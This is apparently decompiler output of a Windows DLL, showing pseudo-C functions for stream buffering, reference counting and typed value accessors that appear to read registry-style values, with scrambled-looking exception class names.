// 100740F4: using guessed type int (__thiscall *off_100740F4)(void *Block, char);

//----- (1001B690) --------------------------------------------------------
int __thiscall sub_1001B690(_BYTE *this)
{
  int result; // eax
  int v3; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
    result = sub_1001A081(this);
    if ( this[12] )
    {
      v3 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 24))(v3);
    }
  }
  return result;
}

//----- (1001B6C1) --------------------------------------------------------
int __thiscall sub_1001B6C1(void *this)
{
  int v2; // eax

  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 20))(v2);
}

//----- (1001B6D8) --------------------------------------------------------
int __thiscall sub_1001B6D8(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (1001B6E8) --------------------------------------------------------
int __thiscall sub_1001B6E8(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (1001B6F8) --------------------------------------------------------
int __thiscall sub_1001B6F8(_DWORD *this)
{
  return this[2];
}

//----- (1001B6FD) --------------------------------------------------------
BOOL __thiscall sub_1001B6FD(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2) )
      return 1;
  }
  return result;
}

//----- (1001B724) --------------------------------------------------------
int __thiscall sub_1001B724(void *this)
{
  int v2; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
}
// 1001B724: using guessed type _DWORD pExceptionObject[2];

//----- (1001B75D) --------------------------------------------------------
int __thiscall sub_1001B75D(void *this, int a2, int a3)
{
  int v4; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    sub_1000E1AC(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 8))(v4, a2, a3);
}
// 1001B75D: using guessed type _DWORD pExceptionObject[2];

//----- (1001B79E) --------------------------------------------------------
int __stdcall sub_1001B79E(int a1, int a2)
{
  _DWORD *v2; // eax
  int result; // eax
  volatile LONG *v4; // [esp-8h] [ebp-2Ch] BYREF
  size_t v5; // [esp-4h] [ebp-28h]
  volatile LONG **v6; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v8; // [esp+20h] [ebp-4h]

  sub_10019FEC(a1);
  v8 = 0;
  v5 = 40;
  *(_DWORD *)a1 = &off_10074124;
  Block = operator new(v5);
  LOBYTE(v8) = 1;
  if ( Block )
  {
    v4 = (volatile LONG *)v5;
    v6 = &v4;
    sub_10018B3B(&v4);
    LOBYTE(v8) = 1;
    v2 = sub_10017C15(-1, 0x40000000, Block, a2, 128, -1, (int)v4, (volatile LONG *)v5);
  }
  else
  {
    v2 = 0;
  }
  LOBYTE(v8) = 0;
  sub_10004726((_DWORD *)(a1 + 8), (int)v2);
  LOBYTE(v8) = 3;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  result = a1;
  *(_BYTE *)(a1 + 16) = 1;
  return result;
}
// 10074124: using guessed type int (__thiscall *off_10074124)(void *Block, char);

//----- (1001B82D) --------------------------------------------------------
_BYTE *__thiscall sub_1001B82D(_BYTE *Block, char a2)
{
  sub_1001B8BA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001B84C) --------------------------------------------------------
int __stdcall sub_1001B84C(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  sub_10019FEC(a1);
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_10074124;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_1000476A(&a2);
  return a1;
}
// 10074124: using guessed type int (__thiscall *off_10074124)(void *Block, char);

//----- (1001B8BA) --------------------------------------------------------
int __thiscall sub_1001B8BA(_BYTE *this)
{
  *(_DWORD *)this = &off_10074124;
  sub_1001B932((int)this);
  sub_1000476A(this + 8);
  return sub_1001A03A(this);
}
// 10074124: using guessed type int (__thiscall *off_10074124)(void *Block, char);

//----- (1001B912) --------------------------------------------------------
int __thiscall sub_1001B912(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 60))(this[2]);
}

//----- (1001B91E) --------------------------------------------------------
int __thiscall sub_1001B91E(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 56))(this[2]);
}

//----- (1001B92A) --------------------------------------------------------
int __thiscall sub_1001B92A(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 72))(this[2]);
}

//----- (1001B932) --------------------------------------------------------
int __thiscall sub_1001B932(int this)
{
  int result; // eax

  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    result = sub_1001A081((_BYTE *)this);
    if ( *(_BYTE *)(this + 16) )
      return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8));
  }
  return result;
}

//----- (1001B956) --------------------------------------------------------
int __thiscall sub_1001B956(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 68))(this[2]);
}

//----- (1001B95E) --------------------------------------------------------
int __thiscall sub_1001B95E(_DWORD **this, int a2, int a3)
{
  int v3; // edx

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = 1;
    }
    else if ( a3 == 2 )
    {
      v3 = 2;
    }
  }
  return (*(int (__thiscall **)(_DWORD *, int, int))(*this[2] + 64))(this[2], a2, v3);
}

//----- (1001B988) --------------------------------------------------------
char sub_1001B988()
{
  return 1;
}

//----- (1001B98B) --------------------------------------------------------
int __stdcall sub_1001B98B(int a1, int a2, int a3, int a4, char a5)
{
  sub_1001B5F6(a1, a2, a5);
  *(_DWORD *)(a1 + 16) = a3;
  *(_DWORD *)(a1 + 20) = a4;
  *(_DWORD *)a1 = &off_10074150;
  sub_1000C28D((void *)1, a1 + 24, 0);
  *(_BYTE *)(a1 + 44) = 0;
  *(_BYTE *)(a1 + 45) = 1;
  return a1;
}
// 10074150: using guessed type int (__thiscall *off_10074150)(void *Block, char);

//----- (1001B9E2) --------------------------------------------------------
void *__thiscall sub_1001B9E2(void *Block, char a2)
{
  sub_1001BA54((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BA01) --------------------------------------------------------
int __stdcall sub_1001BA01(int a1, int a2, int a3)
{
  sub_1001B5F6(a1, a2, 1);
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)a1 = &off_10074150;
  *(_DWORD *)(a1 + 16) = a3;
  sub_1000C28D((void *)1, a1 + 24, 0);
  *(_BYTE *)(a1 + 44) = 0;
  *(_BYTE *)(a1 + 45) = 0;
  return a1;
}
// 10074150: using guessed type int (__thiscall *off_10074150)(void *Block, char);

//----- (1001BA54) --------------------------------------------------------
int __thiscall sub_1001BA54(int this)
{
  *(_DWORD *)this = &off_10074150;
  sub_1001B690((_BYTE *)this);
  sub_1000C45D((int *)(this + 24));
  return sub_1001B64E((_BYTE *)this);
}
// 10074150: using guessed type int (__thiscall *off_10074150)(void *Block, char);

//----- (1001BAAC) --------------------------------------------------------
int __thiscall sub_1001BAAC(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 24;
  *(_BYTE *)sub_1000C55B((int)(this + 24), 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (1001BAD2) --------------------------------------------------------
int __thiscall sub_1001BAD2(_BYTE *this)
{
  int v1; // eax

  v1 = *(_DWORD *)this;
  if ( this[45] )
    return (*(int (**)(void))(v1 + 48))();
  else
    return (*(int (**)(void))(v1 + 52))();
}

//----- (1001BAE5) --------------------------------------------------------
unsigned int __thiscall sub_1001BAE5(void *this, int *a2)
{
  unsigned int result; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  int v7[5]; // [esp+10h] [ebp-54h] BYREF
  int v8[5]; // [esp+24h] [ebp-40h] BYREF
  _DWORD pExceptionObject[2]; // [esp+40h] [ebp-24h] BYREF
  int v10; // [esp+48h] [ebp-1Ch] BYREF
  int v11; // [esp+4Ch] [ebp-18h] BYREF
  unsigned int i; // [esp+50h] [ebp-14h]
  int v13; // [esp+60h] [ebp-4h]

  if ( *((_BYTE *)this + 44) )
  {
    sub_1000E01D(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  v11 = 0;
  for ( i = 0; ; i += v11 )
  {
    result = a2[3];
    if ( i >= result )
      break;
    v4 = result - i;
    if ( result - i >= *((_DWORD *)this + 5) )
      v4 = *((_DWORD *)this + 5);
    v13 = 0;
    v5 = sub_1000C709(v4, a2, (int)v7, i);
    LOBYTE(v13) = 1;
    (*(void (__thiscall **)(_DWORD, int *, int, int, int *))(**((_DWORD **)this + 4) + 12))(
      *((_DWORD *)this + 4),
      v8,
      v5,
      2 * v4,
      &v11);
    LOBYTE(v13) = 3;
    sub_1000C45D(v7);
    if ( v8[3] )
    {
      v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v6 + 12))(v6, v8);
    }
    else if ( !v11 )
    {
      sub_1002E1E7(&v10);
      _CxxThrowException(&v10, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
    }
    LOBYTE(v13) = 0;
    sub_1000C45D(v8);
    v13 = -1;
  }
  return result;
}
// 1001BB88: conditional instruction was optimized away because %var_34.4!=0
// 1001BAE5: using guessed type _DWORD pExceptionObject[2];
// 1001BAE5: using guessed type int var_54[5];

//----- (1001BC24) --------------------------------------------------------
LONG __thiscall sub_1001BC24(_DWORD **this, int *a2)
{
  int *v3; // eax
  int v4; // eax
  int v6[4]; // [esp-14h] [ebp-74h] BYREF
  int v7; // [esp-4h] [ebp-64h]
  int v8[5]; // [esp+10h] [ebp-50h] BYREF
  int v9[5]; // [esp+24h] [ebp-3Ch] BYREF
  _DWORD v10[4]; // [esp+38h] [ebp-28h] BYREF
  int v11; // [esp+5Ch] [ebp-4h]

  v11 = 0;
  sub_1000C28D(0, (int)v9, 0);
  LOBYTE(v11) = 1;
  if ( a2[3] == 1 )
  {
    sub_1000C439(a2, (int)v9);
  }
  else
  {
    v3 = (int *)(*(int (__thiscall **)(_DWORD *, int *, int *))(*this[4] + 4))(this[4], v8, a2);
    LOBYTE(v11) = 2;
    sub_1000C439(v3, (int)v9);
    LOBYTE(v11) = 1;
    sub_1000C45D(v8);
  }
  v7 = 0;
  v4 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
  sub_1001B3FC(v10, v4, 0);
  LOBYTE(v11) = 3;
  sub_1000C3F3(v9, (int)v6);
  LOBYTE(v11) = 3;
  sub_1001B581(v10, v6[0], v6[1], v6[2], v6[3], v7);
  LOBYTE(v11) = 1;
  sub_1001B44E(v10);
  LOBYTE(v11) = 0;
  return sub_1000C45D(v9);
}
// 1001BC24: using guessed type int var_3C[5];
// 1001BC24: using guessed type int var_50[5];
// 1001BC24: using guessed type _DWORD var_28[4];

//----- (1001BCF4) --------------------------------------------------------
LONG __thiscall sub_1001BCF4(_DWORD **this)
{
  LONG result; // eax
  int *v3; // eax
  int v4; // eax
  int v5[5]; // [esp+10h] [ebp-40h] BYREF
  int v6[5]; // [esp+24h] [ebp-2Ch] BYREF
  int v7; // [esp+4Ch] [ebp-4h]

  result = 0;
  if ( *((_BYTE *)this + 45) )
  {
    v7 = 0;
    sub_1000C28D(0, (int)v6, 0);
    LOBYTE(v7) = 1;
    do
    {
      v3 = (int *)(*(int (__thiscall **)(_DWORD *, int *, _DWORD *))(*this[4] + 16))(this[4], v5, this[5]);
      LOBYTE(v7) = 2;
      sub_1000C439(v3, (int)v6);
      LOBYTE(v7) = 1;
      sub_1000C45D(v5);
      v4 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v4 + 12))(v4, v6);
    }
    while ( v6[3] );
    *((_BYTE *)this + 44) = 1;
    LOBYTE(v7) = 0;
    return sub_1000C45D(v6);
  }
  return result;
}
// 1001BCF4: using guessed type int var_40[5];

//----- (1001BD8D) --------------------------------------------------------
char sub_1001BD8D()
{
  return 0;
}

//----- (1001BD90) --------------------------------------------------------
int __stdcall sub_1001BD90(int a1)
{
  bool v1; // al

  *(_DWORD *)a1 = &off_10074B18;
  *(_DWORD *)a1 = &off_10074188;
  v1 = sub_1002E2A5();
  *(_BYTE *)(a1 + 4) = v1;
  if ( v1 )
    InterlockedIncrement(&Addend);
  return a1;
}
// 10074188: using guessed type int (__thiscall *off_10074188)(void *Block, char);
// 10074B18: using guessed type int (__thiscall *off_10074B18)(void *Block, char);

//----- (1001BDEB) --------------------------------------------------------
_BYTE *__thiscall sub_1001BDEB(_BYTE *Block, char a2)
{
  sub_1001BE0A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BE0A) --------------------------------------------------------
void __thiscall sub_1001BE0A(_BYTE *this)
{
  *(_DWORD *)this = &off_10074188;
  InterlockedDecrement(&Addend);
  if ( this[4] && !Addend )
    sub_100319FE();
  *(_DWORD *)this = &off_10074B18;
}
// 10074188: using guessed type int (__thiscall *off_10074188)(void *Block, char);
// 10074B18: using guessed type int (__thiscall *off_10074B18)(void *Block, char);

//----- (1001BE69) --------------------------------------------------------
int __thiscall sub_1001BE69(_BYTE *this, int a2, _DWORD *a3)
{
  _DWORD pExceptionObject[6]; // [esp+14h] [ebp-18h] BYREF

  sub_1000C28D(0, a2, 0);
  pExceptionObject[1] = 1;
  pExceptionObject[5] = 1;
  if ( !this[4] )
  {
    sub_1002E1E7(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
  }
  sub_1002E2C9(a2, a3);
  return a2;
}

//----- (1001BEDE) --------------------------------------------------------
_DWORD *__stdcall sub_1001BEDE(_DWORD *a1)
{
  sub_1000DEEF(a1);
  *a1 = &off_10074190;
  return a1;
}
// 10074190: using guessed type int (__thiscall *off_10074190)(void *Block, char);

//----- (1001BF0C) --------------------------------------------------------
_DWORD *__thiscall sub_1001BF0C(_DWORD *Block, char a2)
{
  sub_1001BF2B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BF2B) --------------------------------------------------------
void __thiscall sub_1001BF2B(_DWORD *this)
{
  *this = &off_10074190;
  sub_1000DF1A(this);
}
// 10074190: using guessed type int (__thiscall *off_10074190)(void *Block, char);

//----- (1001BF4F) --------------------------------------------------------
_DWORD *__stdcall sub_1001BF4F(_DWORD *a1, int a2, int a3)
{
  sub_1001B5F6((int)a1, a2, 1);
  a1[5] = 0;
  *a1 = &off_10074198;
  a1[4] = a3;
  return a1;
}
// 10074198: using guessed type int (__thiscall *off_10074198)(void *Block, char);

//----- (1001BF8B) --------------------------------------------------------
_BYTE *__thiscall sub_1001BF8B(_BYTE *Block, char a2)
{
  sub_1001BFAA(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BFAA) --------------------------------------------------------
int __thiscall sub_1001BFAA(_BYTE *this)
{
  *(_DWORD *)this = &off_10074198;
  sub_1001B690(this);
  return sub_1001B64E(this);
}
// 10074198: using guessed type int (__thiscall *off_10074198)(void *Block, char);

//----- (1001BFEC) --------------------------------------------------------
int __thiscall sub_1001BFEC(_DWORD *this, int pExceptionObject)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int result; // eax

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v3 + 32))(v3) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  }
  else
  {
    v5 = this[5];
  }
  if ( this[4] < (unsigned int)(v5 + 1) )
  {
    sub_1001BEDE(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVUwwroNiqrrorTaapnauww_yq_sr__);
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v6 + 16))(v6, pExceptionObject);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 32))(v7);
  if ( !(_BYTE)result )
    ++this[5];
  return result;
}

//----- (1001C08E) --------------------------------------------------------
int __thiscall sub_1001C08E(_DWORD *this, int pExceptionObject)
{
  int v2; // ebx
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int result; // eax

  v2 = pExceptionObject;
  v4 = *(_DWORD *)(pExceptionObject + 12);
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 32))(v5) )
  {
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
  }
  else
  {
    v7 = this[5];
  }
  if ( this[4] < (unsigned int)(v4 + v7) )
  {
    sub_1001BEDE(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVUwwroNiqrrorTaapnauww_yq_sr__);
  }
  v8 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 12))(v8, v2);
  v9 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 32))(v9);
  if ( !(_BYTE)result )
    this[5] += v4;
  return result;
}

//----- (1001C108) --------------------------------------------------------
char sub_1001C108()
{
  return 1;
}

//----- (1001C10B) --------------------------------------------------------
_DWORD *__stdcall sub_1001C10B(_DWORD *a1, int pExceptionObject, int a3)
{
  int v4; // [esp-8h] [ebp-30h]
  int v5[5]; // [esp+10h] [ebp-18h] BYREF
  int v6; // [esp+24h] [ebp-4h]

  v4 = pExceptionObject;
  *a1 = off_100741C8;
  sub_1001E4AC(v4, a1 + 1);
  v6 = 1;
  sub_10009F32(a1 + 3, a3);
  sub_1001DF9C(v5, pExceptionObject);
  LOBYTE(v6) = 2;
  if ( !sub_1001E2BE((int)v5, a3) )
  {
    sub_1002E4FD(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVRcclrLlnuKrzOsvviGrcclrlln_qsbdzsml_sr__);
  }
  LOBYTE(v6) = 1;
  sub_1001DFCF(v5);
  return a1;
}
// 100741C8: using guessed type int (__thiscall *off_100741C8[5])(void *Block, char);
// 1001C10B: using guessed type int var_18[5];

//----- (1001C191) --------------------------------------------------------
int *__thiscall sub_1001C191(int *Block, char a2)
{
  sub_1001C2B3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C212) --------------------------------------------------------
_DWORD *__thiscall sub_1001C212(_DWORD *Block, char a2)
{
  sub_1002E52A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C231) --------------------------------------------------------
_DWORD *__thiscall sub_1001C231(_DWORD *Block, char a2)
{
  sub_1002E488(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C250) --------------------------------------------------------
_DWORD *__stdcall sub_1001C250(_DWORD *a1, int a2)
{
  *a1 = off_100741C8;
  sub_10009D2C(a1 + 1, &word_1008EE3C);
  sub_10009D2C(a1 + 3, &word_1008EE40);
  sub_100021B1((int *)(a2 + 8), a1 + 2);
  sub_100021B1((int *)(a2 + 16), a1 + 4);
  return a1;
}
// 100741C8: using guessed type int (__thiscall *off_100741C8[5])(void *Block, char);

//----- (1001C2B3) --------------------------------------------------------
void __thiscall sub_1001C2B3(int *this)
{
  *this = (int)off_100741C8;
  sub_10009F65(this + 3);
  sub_10009F65(this + 1);
}
// 100741C8: using guessed type int (__thiscall *off_100741C8[5])(void *Block, char);

//----- (1001C2E8) --------------------------------------------------------
BOOL __usercall sub_1001C2E8@<eax>(int a1@<edi>, int a2@<esi>)
{
  return !sub_1000A1C0(a2 + 4, a1 + 4) && !sub_1000A1C0(a2 + 12, a1 + 12);
}

//----- (1001C33C) --------------------------------------------------------
_DWORD *__stdcall sub_1001C33C(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 12);
  return a2;
}

//----- (1001C371) --------------------------------------------------------
_DWORD *__stdcall sub_1001C371(int a1, _DWORD *a2)
{
  sub_10009F32(a2, a1 + 4);
  return a2;
}

//----- (1001C3A6) --------------------------------------------------------
int __thiscall sub_1001C3A6(void *this, int a2)
{
  int v3; // eax
  char v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+14h] [ebp-10h]

  v6 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int, int, int, char *))(*(_DWORD *)v3 + 28))(v3, a2, (int)this + 4, (int)this + 12, v5);
  return a2;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C3A6: using guessed type char var_14[4];

//----- (1001C3F4) --------------------------------------------------------
int __thiscall sub_1001C3F4(void *this)
{
  int v2; // eax
  int v3; // esi
  int (__thiscall **v4)(void *, char); // edx
  int *v5; // ecx
  _DWORD v7[5]; // [esp+10h] [ebp-28h] BYREF
  int (__thiscall **pExceptionObject)(void *, char); // [esp+24h] [ebp-14h] BYREF
  int v9[3]; // [esp+28h] [ebp-10h] BYREF
  int v10; // [esp+34h] [ebp-4h]

  sub_1000922C();
  v2 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, _DWORD *, int, int, int *))(*(_DWORD *)v2 + 28))(
    v2,
    v7,
    (int)this + 4,
    (int)this + 12,
    v9);
  v10 = 0;
  if ( v9[0] != 4 )
  {
    sub_1002E4AC(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_100741CC;
  LOBYTE(v10) = 1;
  v3 = *(_DWORD *)sub_1000C52E(v7);
  pExceptionObject = v4;
  v10 = -1;
  sub_1000C45D(v5);
  return v3;
}
// 1001C464: variable 'v4' is possibly undefined
// 1001C46B: variable 'v5' is possibly undefined
// 100741CC: using guessed type int (__thiscall *off_100741CC[4])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C3F4: using guessed type int var_10[3];
// 1001C3F4: using guessed type _DWORD var_28[5];

//----- (1001C4C8) --------------------------------------------------------
_DWORD *__thiscall sub_1001C4C8(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 1 )
  {
    sub_1002E4AC(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_100741D0;
  LOBYTE(v9) = 2;
  sub_1001C93E(v5, a2);
  v6 = 1;
  pExceptionObject = off_100741D0;
  LOBYTE(v9) = 0;
  sub_1000C45D(v5);
  return a2;
}
// 100741D0: using guessed type int (__thiscall *off_100741D0[3])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C4C8: using guessed type int var_10[3];
// 1001C4C8: using guessed type int var_2C[5];

//----- (1001C55A) --------------------------------------------------------
_DWORD *__thiscall sub_1001C55A(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 7 )
  {
    sub_1002E4AC(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_100741D4;
  LOBYTE(v9) = 2;
  sub_1001CA1C(v5, a2);
  v6 = 1;
  pExceptionObject = off_100741D4;
  LOBYTE(v9) = 0;
  sub_1000C45D(v5);
  return a2;
}
// 100741D4: using guessed type int (__thiscall *off_100741D4[2])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C55A: using guessed type int var_10[3];
// 1001C55A: using guessed type int var_2C[5];

//----- (1001C5ED) --------------------------------------------------------
_DWORD *__thiscall sub_1001C5ED(void *this, _DWORD *a2)
{
  int v3; // eax
  int v5[5]; // [esp+10h] [ebp-2Ch] BYREF
  int v6; // [esp+24h] [ebp-18h]
  int (__thiscall **pExceptionObject)(void *, char); // [esp+28h] [ebp-14h] BYREF
  int v8[3]; // [esp+2Ch] [ebp-10h] BYREF
  int v9; // [esp+38h] [ebp-4h]

  v6 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  (*(void (__thiscall **)(int, int *, int, int, int *))(*(_DWORD *)v3 + 28))(v3, v5, (int)this + 4, (int)this + 12, v8);
  v9 = 1;
  if ( v8[0] != 2 )
  {
    sub_1002E4AC(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI3_AVFqpgtZkqrTzylfxafQpgtzkqrt_qsbdzsml_sr__);
  }
  pExceptionObject = off_100741D0;
  LOBYTE(v9) = 2;
  sub_1001C93E(v5, a2);
  v6 = 1;
  pExceptionObject = off_100741D0;
  LOBYTE(v9) = 0;
  sub_1000C45D(v5);
  return a2;
}
// 100741D0: using guessed type int (__thiscall *off_100741D0[3])(void *Block, char);
// 10091D5C: using guessed type int dword_10091D5C;
// 1001C5ED: using guessed type int var_10[3];
// 1001C5ED: using guessed type int var_2C[5];

//----- (1001C6B1) --------------------------------------------------------
LONG __thiscall sub_1001C6B1(void *this, int a2)
{
  int v3; // edi
  int v4; // eax
  int v6[8]; // [esp+10h] [ebp-24h] BYREF
  int v7; // [esp+30h] [ebp-4h]

  v6[5] = (int)off_100741CC;
  v7 = 0;
  sub_1000922C();
  v3 = sub_1001DE2D((_DWORD *)dword_10091D5C);
  v4 = sub_1001C8D7((int)v6, a2);
  LOBYTE(v7) = 1;
  (*(void (__thiscall **)(int, int, int, int, int))(*(_DWORD *)v3 + 32))(v3, (int)this + 4, (int)this + 12, v4, 4);
  LOBYTE(v7) = 0;
  return sub_1000C45D(v6);
}
